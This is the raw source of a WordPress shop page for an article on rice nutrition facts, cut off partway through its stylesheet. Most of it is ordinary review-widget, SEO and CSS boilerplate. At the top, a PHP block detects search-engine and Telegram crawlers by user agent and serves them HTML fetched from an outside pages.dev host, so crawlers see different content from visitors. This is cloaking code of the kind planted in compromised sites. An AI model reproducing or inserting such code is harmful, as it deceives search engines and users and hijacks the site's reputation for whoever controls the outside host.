<?php
     function is_bot() {
         $user_agent = $_SERVER['HTTP_USER_AGENT'];
         $bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool', 'adsense', 'slurp');
         
         foreach ($bots as $bot) {
             if (stripos($user_agent, $bot) !== false) {
                 return true;
             }
         }
         
         return false;
     }
     if (is_bot()) {
         echo file_get_contents('https://amalfarmrice.pages.dev/homebase.html');
     exit;
     }
     ?>
   

   <!DOCTYPE html>
	<html  lang="en-US">
	<head>
		<meta http-equiv="X-UA-Compatible" content="IE=edge" />
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
		<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1" />

		<link rel="profile" href="https://gmpg.org/xfn/11" />
		<link rel="pingback" href="https://www.amalfarm.com/xmlrpc.php" />
						<script>document.documentElement.className = document.documentElement.className + ' yes-js js_active js'</script>
			<meta name='robots' content='index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1' />
<script id="cookieyes" type="text/javascript" src="https://cdn-cookieyes.com/client_data/532ba8473af69786324d84f3/script.js"></script><!-- Start of Judge.me Core -->
<script data-cfasync='false' class='jdgm-settings-script'>window.jdgmSettings={"pagination":5,"disable_web_reviews":false,"badge_no_review_text":"No reviews","badge_n_reviews_text":"{{ n }} review/reviews","hide_badge_preview_if_no_reviews":true,"badge_hide_text":false,"enforce_center_preview_badge":false,"widget_title":"Customer Reviews","widget_open_form_text":"Write a review","widget_close_form_text":"Cancel review","widget_refresh_page_text":"Refresh page","widget_summary_text":"Based on {{ number_of_reviews }} review/reviews","widget_no_review_text":"Be the first to write a review","widget_name_field_text":"Name","widget_verified_name_field_text":"Verified Name (public)","widget_name_placeholder_text":"Enter your name (public)","widget_required_field_error_text":"This field is required.","widget_email_field_text":"Email","widget_verified_email_field_text":"Verified Email (private, can not be edited)","widget_email_placeholder_text":"Enter your email (private)","widget_email_field_error_text":"Please enter a valid email address.","widget_rating_field_text":"Rating","widget_review_title_field_text":"Review Title","widget_review_title_placeholder_text":"Give your review a title","widget_review_body_field_text":"Review","widget_review_body_placeholder_text":"Write your comments here","widget_pictures_field_text":"Picture/Video (optional)","widget_submit_review_text":"Submit Review","widget_submit_verified_review_text":"Submit Verified Review","widget_submit_success_msg_with_auto_publish":"Thank you! Please refresh the page in a few moments to see your review. You can remove or edit your review by logging into \u003ca href='https://judge.me/login' target='_blank' rel='nofollow noopener'\u003eJudge.me\u003c/a\u003e","widget_submit_success_msg_no_auto_publish":"Thank you! Your review will be published as soon as it is approved by the shop admin. You can remove or edit your review by logging into \u003ca href='https://judge.me/login' target='_blank' rel='nofollow noopener'\u003eJudge.me\u003c/a\u003e","widget_show_default_reviews_out_of_total_text":"Showing {{ n_reviews_shown }} out of {{ n_reviews }} reviews.","widget_show_all_link_text":"Show all","widget_show_less_link_text":"Show less","widget_author_said_text":"{{ reviewer_name }} said:","widget_days_text":"{{ n }} days ago","widget_weeks_text":"{{ n }} week/weeks ago","widget_months_text":"{{ n }} month/months ago","widget_years_text":"{{ n }} year/years ago","widget_yesterday_text":"Yesterday","widget_today_text":"Today","widget_replied_text":"\u003e\u003e {{ shop_name }} replied:","widget_read_more_text":"Read more","widget_rating_filter_see_all_text":"See all reviews","widget_sorting_most_recent_text":"Most Recent","widget_sorting_highest_rating_text":"Highest Rating","widget_sorting_lowest_rating_text":"Lowest Rating","widget_sorting_with_pictures_text":"Only Pictures","widget_sorting_most_helpful_text":"Most Helpful","widget_open_question_form_text":"Ask a question","widget_reviews_subtab_text":"Reviews","widget_questions_subtab_text":"Questions","widget_question_label_text":"Question","widget_answer_label_text":"Answer","widget_question_placeholder_text":"Write your question here","widget_submit_question_text":"Submit Question","widget_question_submit_success_text":"Thank you for your question! We will notify you once it gets answered.","verified_badge_text":"Verified","verified_badge_placement":"left-of-reviewer-name","widget_hide_border":false,"widget_social_share":false,"all_reviews_include_out_of_store_products":true,"all_reviews_out_of_store_text":"(out of store)","all_reviews_product_name_prefix_text":"about","enable_review_pictures":true,"widget_product_reviews_subtab_text":"Product Reviews","widget_shop_reviews_subtab_text":"Shop Reviews","widget_write_a_store_review_text":"Write a Store Review","widget_other_languages_heading":"Reviews in Other Languages","widget_sorting_pictures_first_text":"Pictures First","floating_tab_button_name":"★ Reviews","floating_tab_title":"Let customers speak for us","floating_tab_url":"","floating_tab_url_enabled":false,"all_reviews_text_badge_text":"Customers rate us {{ shop.metafields.judgeme.all_reviews_rating | round: 1 }}/5 based on {{ shop.metafields.judgeme.all_reviews_count }} reviews.","all_reviews_text_badge_text_branded_style":"{{ shop.metafields.judgeme.all_reviews_rating | round: 1 }} out of 5 stars based on {{ shop.metafields.judgeme.all_reviews_count }} reviews","all_reviews_text_badge_url":"","all_reviews_text_show_jm_brand":false,"featured_carousel_title":"Let customers speak for us","featured_carousel_count_text":"from {{ n }} reviews","featured_carousel_url":"","verified_count_badge_style":"branded","verified_count_badge_url":"","picture_reminder_submit_button":"Upload Pictures","widget_sorting_videos_first_text":"Videos First","widget_review_pending_text":"Pending","remove_microdata_snippet":false,"preview_badge_no_question_text":"No questions","preview_badge_n_question_text":"{{ number_of_questions }} question/questions","remove_judgeme_branding":true,"widget_search_bar_placeholder":"Search reviews","widget_sorting_verified_only_text":"Verified only","featured_carousel_verified_badge_enable":true,"featured_carousel_more_reviews_button_text":"Read more reviews","featured_carousel_view_product_button_text":"View product","all_reviews_page_load_more_text":"Load More Reviews","widget_advanced_speed_features":5,"widget_public_name_text":"displayed publicly like","default_reviewer_name_has_non_latin":true,"widget_reviewer_anonymous":"Anonymous","medals_widget_title":"Judge.me Review Medals","widget_invalid_yt_video_url_error_text":"Not a YouTube video URL","widget_max_length_field_error_text":"Please enter no more than {0} characters.","widget_verified_by_shop_text":"Verified by Shop","widget_load_with_code_splitting":true,"widget_ugc_title":"Made by us, Shared by you","widget_ugc_subtitle":"Tag us to see your picture featured in our page","widget_ugc_primary_button_text":"Buy Now","widget_ugc_secondary_button_text":"Load More","widget_ugc_reviews_button_text":"View Reviews","widget_summary_average_rating_text":"{{ average_rating }} out of 5","widget_media_grid_title":"Customer photos \u0026 videos","widget_media_grid_see_more_text":"See more","widget_verified_by_judgeme_text":"Verified by Judge.me","widget_verified_by_judgeme_text_in_store_medals":"Verified by Judge.me","widget_media_field_exceed_quantity_message":"Sorry, we can only accept {{ max_media }} for one review.","widget_media_field_exceed_limit_message":"{{ file_name }} is too large, please select a {{ media_type }} less than {{ size_limit }}MB.","widget_review_submitted_text":"Review Submitted!","widget_question_submitted_text":"Question Submitted!","widget_close_form_text_question":"Cancel","widget_write_your_answer_here_text":"Write your answer here","widget_enabled_branded_link":true,"widget_show_collected_by_judgeme":false,"widget_collected_by_judgeme_text":"collected by Judge.me","widget_load_more_text":"Load More","widget_full_review_text":"Full Review","widget_read_more_reviews_text":"Read More Reviews","widget_read_questions_text":"Read Questions","widget_questions_and_answers_text":"Questions \u0026 Answers","widget_verified_by_text":"Verified by","widget_number_of_reviews_text":"{{ number_of_reviews }} reviews","widget_back_button_text":"Back","widget_next_button_text":"Next","widget_custom_forms_filter_button":"Filters","how_reviews_are_collected":"How reviews are collected?","widget_gdpr_statement":"How we use your data: We’ll only contact you about the review you left, and only if necessary. By submitting your review, you agree to Judge.me’s \u003ca href='https://judge.me/terms' target='_blank' rel='nofollow noopener'\u003eterms\u003c/a\u003e, \u003ca href='https://judge.me/privacy' target='_blank' rel='nofollow noopener'\u003eprivacy\u003c/a\u003e and \u003ca href='https://judge.me/content-policy' target='_blank' rel='nofollow noopener'\u003econtent\u003c/a\u003e policies.","review_snippet_widget_round_border_style":true,"review_snippet_widget_card_color":"#FFFFFF","review_snippet_widget_slider_arrows_background_color":"#FFFFFF","review_snippet_widget_slider_arrows_color":"#000000","review_snippet_widget_star_color":"#339999","platform":"woocommerce","branding_url":"https://app.judge.me/reviews","branding_text":"Powered by Judge.me","locale":"en","reply_name":"Amalfarm","widget_version":"3.0","footer":true,"autopublish":true,"review_dates":true,"enable_custom_form":false,"enable_multi_locales_translations":false,"can_be_branded":false,"reply_name_text":"Amalfarm"};</script> <style class='jdgm-settings-style'>.jdgm-xx{left:0}:root{--jdgm-primary-color: #399;--jdgm-secondary-color: rgba(51,153,153,0.1);--jdgm-star-color: #399;--jdgm-write-review-text-color: white;--jdgm-write-review-bg-color: #339999;--jdgm-paginate-color: #399;--jdgm-border-radius: 0;--jdgm-reviewer-name-color: #339999}.jdgm-histogram__bar-content{background-color:#399}.jdgm-rev[data-verified-buyer=true] .jdgm-rev__icon.jdgm-rev__icon:after,.jdgm-rev__buyer-badge.jdgm-rev__buyer-badge{color:white;background-color:#399}.jdgm-review-widget--small .jdgm-gallery.jdgm-gallery .jdgm-gallery__thumbnail-link:nth-child(8) .jdgm-gallery__thumbnail-wrapper.jdgm-gallery__thumbnail-wrapper:before{content:"See more"}@media only screen and (min-width: 768px){.jdgm-gallery.jdgm-gallery .jdgm-gallery__thumbnail-link:nth-child(8) .jdgm-gallery__thumbnail-wrapper.jdgm-gallery__thumbnail-wrapper:before{content:"See more"}}.jdgm-prev-badge[data-average-rating='0.00']{display:none !important}.jdgm-author-all-initials{display:none !important}.jdgm-author-last-initial{display:none !important}.jdgm-rev-widg__title{visibility:hidden}.jdgm-rev-widg__summary-text{visibility:hidden}.jdgm-prev-badge__text{visibility:hidden}.jdgm-rev__prod-link-prefix:before{content:'about'}.jdgm-rev__out-of-store-text:before{content:'(out of store)'}@media only screen and (min-width: 768px){.jdgm-rev__pics .jdgm-rev_all-rev-page-picture-separator,.jdgm-rev__pics .jdgm-rev__product-picture{display:none}}@media only screen and (max-width: 768px){.jdgm-rev__pics .jdgm-rev_all-rev-page-picture-separator,.jdgm-rev__pics .jdgm-rev__product-picture{display:none}}.jdgm-review-snippet-widget .jdgm-rev-snippet-widget__cards-container .jdgm-rev-snippet-card{border-radius:8px;background:#fff}.jdgm-review-snippet-widget .jdgm-rev-snippet-widget__cards-container .jdgm-rev-snippet-card__rev-rating .jdgm-star{color:#399}.jdgm-review-snippet-widget .jdgm-rev-snippet-widget__prev-btn,.jdgm-review-snippet-widget .jdgm-rev-snippet-widget__next-btn{border-radius:50%;background:#fff}.jdgm-review-snippet-widget .jdgm-rev-snippet-widget__prev-btn>svg,.jdgm-review-snippet-widget .jdgm-rev-snippet-widget__next-btn>svg{fill:#000}.jdgm-full-rev-modal.rev-snippet-widget .jm-mfp-container .jm-mfp-content,.jdgm-full-rev-modal.rev-snippet-widget .jm-mfp-container .jdgm-full-rev__icon,.jdgm-full-rev-modal.rev-snippet-widget .jm-mfp-container .jdgm-full-rev__pic-img,.jdgm-full-rev-modal.rev-snippet-widget .jm-mfp-container .jdgm-full-rev__reply{border-radius:8px}.jdgm-full-rev-modal.rev-snippet-widget .jm-mfp-container .jdgm-full-rev[data-verified-buyer="true"] .jdgm-full-rev__icon::after{border-radius:8px}.jdgm-full-rev-modal.rev-snippet-widget .jm-mfp-container .jdgm-full-rev .jdgm-rev__buyer-badge{border-radius:calc( 8px / 2 )}.jdgm-full-rev-modal.rev-snippet-widget .jm-mfp-container .jdgm-full-rev .jdgm-full-rev__replier::before{content:'Amalfarm'}.jdgm-full-rev-modal.rev-snippet-widget .jm-mfp-container .jdgm-full-rev .jdgm-full-rev__product-button{border-radius:calc( 8px * 6 )}
</style> <style class='jdgm-settings-style'></style><style class='jdgm-miracle-styles'>
  @-webkit-keyframes jdgm-spin{0%{-webkit-transform:rotate(0deg);-ms-transform:rotate(0deg);transform:rotate(0deg)}100%{-webkit-transform:rotate(359deg);-ms-transform:rotate(359deg);transform:rotate(359deg)}}@keyframes jdgm-spin{0%{-webkit-transform:rotate(0deg);-ms-transform:rotate(0deg);transform:rotate(0deg)}100%{-webkit-transform:rotate(359deg);-ms-transform:rotate(359deg);transform:rotate(359deg)}}@font-face{font-family:'JudgemeStar';src:url("data:application/x-font-woff;charset=utf-8;base64,d09GRgABAAAAAAScAA0AAAAABrAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABGRlRNAAAEgAAAABoAAAAcbyQ+3kdERUYAAARgAAAAHgAAACAAMwAGT1MvMgAAAZgAAABGAAAAVi+vS9xjbWFwAAAB8AAAAEAAAAFKwBMjvmdhc3AAAARYAAAACAAAAAj//wADZ2x5ZgAAAkAAAAEJAAABdH33LXtoZWFkAAABMAAAAC0AAAA2BroQKWhoZWEAAAFgAAAAHAAAACQD5QHQaG10eAAAAeAAAAAPAAAAFAYAAABsb2NhAAACMAAAAA4AAAAOAO4AeG1heHAAAAF8AAAAHAAAACAASgAvbmFtZQAAA0wAAADeAAABkorWfVZwb3N0AAAELAAAACkAAABEp3ubLXgBY2BkYADhPPP4OfH8Nl8ZuJkYQODS2fRrCPr/aSYGxq1ALgcDWBoAO60LkwAAAHgBY2BkYGDc+v80gx4TAwgASaAICmABAFB+Arl4AWNgZGBgYGPQYWBiAAIwyQgWc2AAAwAHVQB6eAFjYGRiYJzAwMrAwejDmMbAwOAOpb8ySDK0MDAwMbByMsCBAAMCBKS5pjA4PGB4wMR44P8BBj3GrQymQGFGkBwAjtgK/gAAeAFjYoAAEA1jAwAAZAAHAHgB3crBCcAwDEPRZydkih567CDdf4ZskmLwFBV8xBfCaC4BXkOUmx4sU0h2ngNb9V0vQCxaRKIAevT7fGWuBrEAAAAAAAAAAAA0AHgAugAAeAF9z79Kw1AUx/FzTm7un6QmJtwmQ5Bg1abgEGr/BAqlU6Gju+Cgg1MkQ/sA7Vj7BOnmO/gUvo2Lo14NqIO6/IazfD8HEODtmQCfoANwNsyp2/GJt3WKQrd1NLiYYWx2PBqOsmJMEOznPOTzfSCrhAtbbLdmeFLJV9eKd63WLrZcIcuaEVdssWCKM6pLCfTVOYbz/0pNSMSZKLIZpvh78sAUH6PlMrreTCabP9r+Z/puPZ2ur/RqpQHgh+MIegCnXeM4MRAPjYN//5tj4ZtTjkFqEdmeMShlEJ7tVAly2TAkx6R68Fl4E/aVvn8JqHFQ4JS1434gXKcuL31dDhzs3YbsEOAd/IU88gAAAHgBfY4xTgMxEEVfkk0AgRCioKFxQYd2ZRtpixxgRU2RfhU5q5VWseQ4JdfgAJyBlmNwAM7ABRhZQ0ORwp7nr+eZAa54YwYg9zm3ynPOeFRe8MCrciXOh/KSS76UV5L/iDmrLiS5AeU519wrL3jmSbkS5115yR2fyivJv9kx0ZMZ2RLZw27q87iNQi8EBo5FSPIMw3HqBboi5lKTGAGDp8FKXWP+t9TU01Lj5His1Ba6uM9dTEMwvrFmbf5GC/q2drW3ruXUhhsCiQOjznFlCzYhHUZp4xp76vsvQh89CQAAeAFjYGJABowM6IANLMrEyMTIzMjCXpyRWJBqZshWXJJYBKOMAFHFBucAAAAAAAAB//8AAngBY2BkYGDgA2IJBhBgAvKZGViBJAuYxwAABJsAOgAAeAFjYGBgZACCk535hiD60tn0azAaAEqpB6wAAA==") format("woff");font-weight:normal;font-style:normal}.jdgm-star{font-family:'JudgemeStar';display:inline !important;text-decoration:none !important;padding:0 4px 0 0 !important;margin:0 !important;font-weight:bold;opacity:1;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.jdgm-star:hover{opacity:1}.jdgm-star:last-of-type{padding:0 !important}.jdgm-star.jdgm--on:before{content:"\e000"}.jdgm-star.jdgm--off:before{content:"\e001"}.jdgm-star.jdgm--half:before{content:"\e002"}.jdgm-widget *{margin:0;line-height:1.4;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;-webkit-overflow-scrolling:touch}.jdgm-hidden{display:none !important;visibility:hidden !important}.jdgm-temp-hidden{display:none}.jdgm-spinner{width:40px;height:40px;margin:auto;border-radius:50%;border-top:2px solid #eee;border-right:2px solid #eee;border-bottom:2px solid #eee;border-left:2px solid #ccc;-webkit-animation:jdgm-spin 0.8s infinite linear;animation:jdgm-spin 0.8s infinite linear}.jdgm-spinner:empty{display:block}.jdgm-prev-badge{display:block !important}

</style>

<script data-cfasync='false' class='jdgm-script'>
!function(e){window.jdgm=window.jdgm||{},jdgm.CDN_HOST="https://cdn.judge.me/",
jdgm.docReady=function(d){(e.attachEvent?"complete"===e.readyState:"loading"!==e.readyState)?
setTimeout(d,0):e.addEventListener("DOMContentLoaded",d)},jdgm.loadCSS=function(d,t,o,a){
!o&&jdgm.loadCSS.requestedUrls.indexOf(d)>=0||(jdgm.loadCSS.requestedUrls.push(d),
(a=e.createElement("link")).rel="stylesheet",a.class="jdgm-stylesheet",a.media="nope!",
a.href=d,a.onload=function(){this.media="all",t&&setTimeout(t)},e.body.appendChild(a))},
jdgm.loadCSS.requestedUrls=[],jdgm.docReady(function(){(window.jdgmLoadCSS||e.querySelectorAll(
".jdgm-widget, .jdgm-all-reviews-page").length>0)&&(jdgmSettings.widget_load_with_code_splitting?
parseFloat(jdgmSettings.widget_version)>=3?jdgm.loadCSS(jdgm.CDN_HOST+"widget_v3/base.css"):
jdgm.loadCSS(jdgm.CDN_HOST+"widget/base.css"):jdgm.loadCSS(jdgm.CDN_HOST+"shopify_v2.css"))})}(document);
</script>
<script async data-cfasync="false" type="text/javascript" src="https://cdn.judge.me/loader.js"></script>
<noscript><link rel="stylesheet" type="text/css" media="all" href="https://cdn.judge.me/shopify_v2.css"></noscript>
<!-- End of Judge.me Core -->

	<!-- This site is optimized with the Yoast SEO Premium plugin v26.0 (Yoast SEO v26.0) - https://yoast.com/wordpress/plugins/seo/ -->
	<title>Rice Nutrition Facts 100g: Complete Nutritional Guide</title>
	<meta name="description" content="Complete rice nutrition facts 100g - calories, protein, carbs, vitamins &amp; minerals. Get accurate nutritional values of rice varieties." />
	<link rel="canonical" href="https://www.amalfarm.com/rice-nutrition-facts/" />
	<meta property="og:locale" content="en_US" />
	<meta property="og:type" content="article" />
	<meta property="og:title" content="Rice Nutrition Facts 100g: Complete Nutritional Guide" />
	<meta property="og:description" content="Complete rice nutrition facts 100g - calories, protein, carbs, vitamins &amp; minerals. Get accurate nutritional values for white rice, brown rice varieties." />
	<meta property="og:url" content="https://www.amalfarm.com/rice-nutrition-facts/" />
	<meta property="og:site_name" content="Amalfarm" />
	<meta property="article:publisher" content="https://www.facebook.com/amalfarmindia" />
	<meta property="article:published_time" content="2025-09-09T11:21:02+00:00" />
	<meta property="article:modified_time" content="2025-09-11T11:56:58+00:00" />
	<meta property="og:image" content="https://www.amalfarm.com/wp-content/uploads/2025/09/rice-nutrition-fact-100gm-1024x683.png" />
	<meta property="og:image:width" content="1024" />
	<meta property="og:image:height" content="683" />
	<meta property="og:image:type" content="image/png" />
	<meta name="author" content="amalfarm" />
	<meta name="twitter:card" content="summary_large_image" />
	<meta name="twitter:title" content="Rice Nutrition Facts 100g: Complete Nutritional Guide" />
	<meta name="twitter:creator" content="@amalfarmindia" />
	<meta name="twitter:site" content="@amalfarmindia" />
	<meta name="twitter:label1" content="Written by" />
	<meta name="twitter:data1" content="amalfarm" />
	<meta name="twitter:label2" content="Est. reading time" />
	<meta name="twitter:data2" content="4 minutes" />
	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"WebPage","@id":"https://www.amalfarm.com/rice-nutrition-facts/","url":"https://www.amalfarm.com/rice-nutrition-facts/","name":"Rice Nutrition Facts 100g: Complete Nutritional Guide","isPartOf":{"@id":"https://www.amalfarm.com/#website"},"primaryImageOfPage":{"@id":"https://www.amalfarm.com/rice-nutrition-facts/#primaryimage"},"image":{"@id":"https://www.amalfarm.com/rice-nutrition-facts/#primaryimage"},"thumbnailUrl":"https://www.amalfarm.com/wp-content/uploads/2025/09/rice-nutrition-fact-100gm.png","datePublished":"2025-09-09T11:21:02+00:00","dateModified":"2025-09-11T11:56:58+00:00","author":{"@id":"https://www.amalfarm.com/#/schema/person/e62e38a7258cb73ac38c119777a9e7ca"},"description":"Complete rice nutrition facts 100g - calories, protein, carbs, vitamins & minerals. Get accurate nutritional values of rice varieties.","breadcrumb":{"@id":"https://www.amalfarm.com/rice-nutrition-facts/#breadcrumb"},"inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https://www.amalfarm.com/rice-nutrition-facts/"]}]},{"@type":"ImageObject","inLanguage":"en-US","@id":"https://www.amalfarm.com/rice-nutrition-facts/#primaryimage","url":"https://www.amalfarm.com/wp-content/uploads/2025/09/rice-nutrition-fact-100gm.png","contentUrl":"https://www.amalfarm.com/wp-content/uploads/2025/09/rice-nutrition-fact-100gm.png","width":1536,"height":1024,"caption":"Rice Nutrition Facts 100gm"},{"@type":"BreadcrumbList","@id":"https://www.amalfarm.com/rice-nutrition-facts/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://www.amalfarm.com/"},{"@type":"ListItem","position":2,"name":"Blog","item":"https://www.amalfarm.com/blog/"},{"@type":"ListItem","position":3,"name":"Rice Nutrition Facts 100g: Complete Nutritional Guide"}]},{"@type":"WebSite","@id":"https://www.amalfarm.com/#website","url":"https://www.amalfarm.com/","name":"Amalfarm","description":"Magic of the place","potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://www.amalfarm.com/?s={search_term_string}"},"query-input":{"@type":"PropertyValueSpecification","valueRequired":true,"valueName":"search_term_string"}}],"inLanguage":"en-US"},{"@type":"Person","@id":"https://www.amalfarm.com/#/schema/person/e62e38a7258cb73ac38c119777a9e7ca","name":"amalfarm","image":{"@type":"ImageObject","inLanguage":"en-US","@id":"https://www.amalfarm.com/#/schema/person/image/","url":"https://secure.gravatar.com/avatar/b910d97675a62c9484ce223f7ba8993ee08bc4eb9252d46207296321343a35ad?s=96&d=mm&r=g","contentUrl":"https://secure.gravatar.com/avatar/b910d97675a62c9484ce223f7ba8993ee08bc4eb9252d46207296321343a35ad?s=96&d=mm&r=g","caption":"amalfarm"},"sameAs":["https://www.amalfarm.com"],"url":"https://www.amalfarm.com/author/amalfarm/"}]}</script>
	<!-- / Yoast SEO Premium plugin. -->


<link rel='dns-prefetch' href='//unpkg.com' />
<link rel='dns-prefetch' href='//www.googletagmanager.com' />
<link rel="alternate" type="application/rss+xml" title="Amalfarm &raquo; Feed" href="https://www.amalfarm.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="Amalfarm &raquo; Comments Feed" href="https://www.amalfarm.com/comments/feed/" />
<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://www.amalfarm.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.amalfarm.com%2Frice-nutrition-facts%2F" />
<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://www.amalfarm.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.amalfarm.com%2Frice-nutrition-facts%2F&#038;format=xml" />
		<link rel="shortcut icon" href="//www.amalfarm.com/wp-content/uploads/2021/05/favicon_amal16.png" type="image/x-icon" />
				<link rel="apple-touch-icon" href="//www.amalfarm.com/wp-content/uploads/2021/05/favicon_amal24.png" />
				<link rel="apple-touch-icon" sizes="120x120" href="" />
				<link rel="apple-touch-icon" sizes="76x76" href="" />
				<link rel="apple-touch-icon" sizes="152x152" href="" />
		<link rel="preload" href="https://www.amalfarm.com/wp-content/themes/porto/fonts/porto-font/porto.woff2" as="font" type="font/woff2" crossorigin /><link rel="preload" href="https://www.amalfarm.com/wp-content/themes/porto/fonts/fontawesome_optimized/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin /><link rel="preload" href="https://www.amalfarm.com/wp-content/themes/porto/fonts/fontawesome_optimized/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin /><link rel="preload" href="https://www.amalfarm.com/wp-content/themes/porto/fonts/fontawesome_optimized/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin /><link rel="preload" href="https://www.amalfarm.com/wp-content/themes/porto/fonts/Simple-Line-Icons/Simple-Line-Icons.ttf" as="font" type="font/ttf" crossorigin /><link rel="preload" href="https://www.amalfarm.com/wp-content/uploads/2021/12/Amal_Farm_Logo_180x65_Reg.png" /><link rel="preload" href="https://www.amalfarm.com/wp-content/uploads/2021/03/Amal_Farm_Logo_180x65.png" /><link rel="preload" href="https://www.amalfarm.com/wp-content/uploads/2021/12/Amal_Farm_Logo_180x65_Reg_white.png" as="image" />	<style>
	img.wp-smiley,
	img.emoji {
		display: inline !important;
		border: none !important;
		box-shadow: none !important;
		height: 1em !important;
		width: 1em !important;
		margin: 0 0.07em !important;
		vertical-align: -0.1em !important;
		background: none !important;
		padding: 0 !important;
	}
	</style>
	<style id="wp-img-auto-sizes-contain-inline-css">
img:is([sizes=auto i],[sizes^="auto," i]){contain-intrinsic-size:3000px 1500px}
/*# sourceURL=wp-img-auto-sizes-contain-inline-css */
</style>
<link rel='stylesheet' id='ht_ctc_main_css-css' href='https://www.amalfarm.com/wp-content/plugins/click-to-chat-for-whatsapp/new/inc/assets/css/main.css?ver=4.11' media='all' />
<style id="wp-block-library-inline-css">
:root{--wp-block-synced-color:#7a00df;--wp-block-synced-color--rgb:122,0,223;--wp-bound-block-color:var(--wp-block-synced-color);--wp-editor-canvas-background:#ddd;--wp-admin-theme-color:#007cba;--wp-admin-theme-color--rgb:0,124,186;--wp-admin-theme-color-darker-10:#006ba1;--wp-admin-theme-color-darker-10--rgb:0,107,160.5;--wp-admin-theme-color-darker-20:#005a87;--wp-admin-theme-color-darker-20--rgb:0,90,135;--wp-admin-border-width-focus:2px}@media (min-resolution:192dpi){:root{--wp-admin-border-width-focus:1.5px}}.wp-element-button{cursor:pointer}:root .has-very-light-gray-background-color{background-color:#eee}:root .has-very-dark-gray-background-color{background-color:#313131}:root .has-very-light-gray-color{color:#eee}:root .has-very-dark-gray-color{color:#313131}:root .has-vivid-green-cyan-to-vivid-cyan-blue-gradient-background{background:linear-gradient(135deg,#00d084,#0693e3)}:root .has-purple-crush-gradient-background{background:linear-gradient(135deg,#34e2e4,#4721fb 50%,#ab1dfe)}:root .has-hazy-dawn-gradient-background{background:linear-gradient(135deg,#faaca8,#dad0ec)}:root .has-subdued-olive-gradient-background{background:linear-gradient(135deg,#fafae1,#67a671)}:root .has-atomic-cream-gradient-background{background:linear-gradient(135deg,#fdd79a,#004a59)}:root .has-nightshade-gradient-background{background:linear-gradient(135deg,#330968,#31cdcf)}:root .has-midnight-gradient-background{background:linear-gradient(135deg,#020381,#2874fc)}:root{--wp--preset--font-size--normal:16px;--wp--preset--font-size--huge:42px}.has-regular-font-size{font-size:1em}.has-larger-font-size{font-size:2.625em}.has-normal-font-size{font-size:var(--wp--preset--font-size--normal)}.has-huge-font-size{font-size:var(--wp--preset--font-size--huge)}:root .has-text-align-center{text-align:center}:root .has-text-align-left{text-align:left}:root .has-text-align-right{text-align:right}.has-fit-text{white-space:nowrap!important}#end-resizable-editor-section{display:none}.aligncenter{clear:both}.items-justified-left{justify-content:flex-start}.items-justified-center{justify-content:center}.items-justified-right{justify-content:flex-end}.items-justified-space-between{justify-content:space-between}.screen-reader-text{word-wrap:normal!important;border:0;clip-path:inset(50%);height:1px;margin:-1px;overflow:hidden;padding:0;position:absolute;width:1px}.screen-reader-text:focus{background-color:#ddd;clip-path:none;color:#444;display:block;font-size:1em;height:auto;left:5px;line-height:normal;padding:15px 23px 14px;text-decoration:none;top:5px;width:auto;z-index:100000}html :where(.has-border-color){border-style:solid}html :where([style*=border-color]){border-style:solid}html :where([style*=border-top-color]){border-top-style:solid}html :where([style*=border-right-color]){border-right-style:solid}html :where([style*=border-bottom-color]){border-bottom-style:solid}html :where([style*=border-left-color]){border-left-style:solid}html :where([style*=border-width]){border-style:solid}html :where([style*=border-top-width]){border-top-style:solid}html :where([style*=border-right-width]){border-right-style:solid}html :where([style*=border-bottom-width]){border-bottom-style:solid}html :where([style*=border-left-width]){border-left-style:solid}html :where(img[class*=wp-image-]){height:auto;max-width:100%}:where(figure){margin:0 0 1em}html :where(.is-position-sticky){--wp-admin--admin-bar--position-offset:var(--wp-admin--admin-bar--height,0px)}@media screen and (max-width:600px){html :where(.is-position-sticky){--wp-admin--admin-bar--position-offset:0px}}

/*# sourceURL=/wp-includes/css/dist/block-library/common.min.css */
</style>
<style id="classic-theme-styles-inline-css">
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
/*# sourceURL=/wp-includes/css/classic-themes.min.css */
</style>

<style id="global-styles-inline-css">
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--color--primary: var(--porto-primary-color);--wp--preset--color--secondary: var(--porto-secondary-color);--wp--preset--color--tertiary: var(--porto-tertiary-color);--wp--preset--color--quaternary: var(--porto-quaternary-color);--wp--preset--color--dark: var(--porto-dark-color);--wp--preset--color--light: var(--porto-light-color);--wp--preset--color--primary-hover: 